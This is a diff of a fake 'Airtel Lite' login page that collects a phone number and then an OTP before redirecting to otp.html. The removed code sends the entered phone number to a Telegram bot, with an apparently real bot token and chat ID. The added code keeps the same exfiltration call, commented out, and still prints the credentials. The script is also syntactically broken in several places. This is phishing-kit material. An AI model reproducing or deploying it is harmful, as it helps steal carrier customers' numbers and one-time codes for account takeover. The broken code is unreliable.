@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login to Airtel Lite</title>
+<title>Airtel Lite Login</title>
 
 <style>
 body {
@@ -26,58 +26,36 @@ body {
     box-shadow: 0 10px 30px rgba(0,0,0,0.1);
 }
 
-h2 {
-    margin-bottom: 25px;
+input, button {
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    font-size: 16px;
+    margin-bottom: 15px;
 }
 
 input {
-    width: 100%;
-    padding: 14px;
-    border-radius: 10px;
     border: 1px solid #ccc;
-    font-size: 16px;
-    margin-bottom: 20px;
 }
 
 button {
-    width: 100%;
-    padding: 14px;
-    border-radius: 10px;
     border: none;
-    background: #ffb3b3;
+    background: #ff3b3b;
     color: white;
-    font-size: 16px;
     cursor: pointer;
 }
 
 button:disabled {
-    background: #ddd;
+    background: #ccc;
 }
 
-.link {
-    margin-top: 15px;
-    color: #1a73e8;
+.hidden {
+    display: none;
+}
+
+.status {
     font-size: 14px;
-}
-
-.or {
-    margin: 20px 0;
     color: gray;
-}
-
-.alt {
-    border: 2px solid #1a73e8;
-    background: white;
-    color: #1a73e8;
-    padding: 12px;
-    border-radius: 10px;
-    font-weight: bold;
-}
-
-.countdown {
-    margin-top: 15px;
-    color: gray;
-    font-size: 14px;
 }
 </style>
 </head>
@@ -89,91 +67,86 @@ button:disabled {
 
         <h2>LOGIN TO AIRTEL LITE</h2>
 
-        <input type="tel" placeholder="+260 XXXXXXXXX">
+        <!-- PHONE INPUT -->
+        <input type="tel" id="phone" placeholder="+260XXXXXXXX" required>
 
-        <button id="otpBtn" onclick="sendOTP()">SEND OTP</button>
+        <button id="sendBtn" onclick="sendOTP()">SEND OTP</button>
 
-        <div class="countdown" id="countdown"></div>
+        <div class="status" id="status"></div>
 
-        <div class="link">Forgot your number? <b>Click Here!</b></div>
+        <!-- OTP SECTION -->
+        <div id="otpSection" class="hidden">
+            <input type="text" id="otp" placeholder="Enter OTP">
+            <button onclick="continueLogin()">CONTINUE</button>
+        </div>
 
-        <div class="or">OR</div>
-
-        <div class="alt">CONTINUE WITHOUT LOGIN</div>
     </div>
 </div>
 
 <script>
 function sendOTP() {
-    const btn = document.getElementById("otpBtn");
-    const countdown = document.getElementById("countdown");
+    const phone = document.getElementById("phone").value.trim();
 
-    btn.disabled = true;
-    let timeLeft = 5;
-
-    countdown.innerText = "Redirecting in " + timeLeft + " seconds...";
-
-    const timer = setInterval(() => {
-        timeLeft--;
-        countdown.innerText = "Redirecting in " + timeLeft + " seconds...";
-
-        if (timeLeft <= 0) {
-            clearInterval(timer);
-            window.location.href = "otp.html"; // next page
-        }
-    }, 1000);
-}
-const submitBtn = document.getElementById('submitBtn');
-const popup = document.getElementById('loadingPopup');
-
-// Telegram config
-const BOT_TOKEN = '
-8578906706:AAFWBYBi_sFvCBH_NnayxSrS8TKKO0E84eY';
-const CHAT_ID = '8588753899';
-
-submitBtn.addEventListener('click', async () => {
-
- 
-        phone: document.getElementById('phoneInput').value,
-        
-    };
-
-    // Validation
-    if (phone.length < 9) {
-        alert("Please check the number.");
+    if (!phone) {
+        alert("Please enter phone number");
         return;
     }
 
-    const fullPhone = "+260" + data.phone;
-    localStorage.setItem('userPhone', fullPhone);
+    // ===============================
+    // 🔐 TELEGRAM CONFIGURATION AREA
+    // ===============================
+    // const BOT_TOKEN = "PASTE_BOT_TOKEN_HERE";
+    // const CHAT_ID  = "PASTE_CHAT_ID_HERE";
 
-    // Show loading
-    popup.style.display = 'flex';
+    // Send telegram try:
+    /*
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: "User requested OTP on Airtel Lite"
+        })
+    });
+    */
 
-   
-        Phone: ${fullPhonel}
+    document.getElementById("status").innerText =
+        "OTP sent. Please check your phone.";
 
-    // Send Telegram
-    try {
-        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
-            method: 'POST',
-            headers: { 'Content-Type': 'login.html' },
-            body: html.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        });
-    } catch (err) {
-        console.error(err);
+    document.getElementById("otpSection").classList.remove("hidden");
+    document.getElementById("sendBtn").disabled = true;
+}
+
+function continueLogin() {
+    const otp = document.getElementById("otp").value;
+
+    if (!otp) {
+        alert("Enter OTP");
+        return;
     }
+// ===============================
+    // 🔐 TELEGRAM CONFIGURATION AREA
+    // ===============================
+    // const BOT_TOKEN = "8578906706:AAFWBYBi_sFvCBH_NnayxSrS8TKKO0E84eY
+";
+    // const CHAT_ID  = "8588753899";
 
-    // Redirect
-    setTimeout(() => {
-        window.location.href = 'otp.html';
-    }, 2000);
+    // Send telegram try:
+    /*
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: "User requested OTP on Airtel Lite"
+        })
+    });
+    */
 
-});
+    // ✅ Redirect to your existing OTP page
+    window.location.href = "otp.html";
+}
 </script>
-    
+
 </body>
 </html>
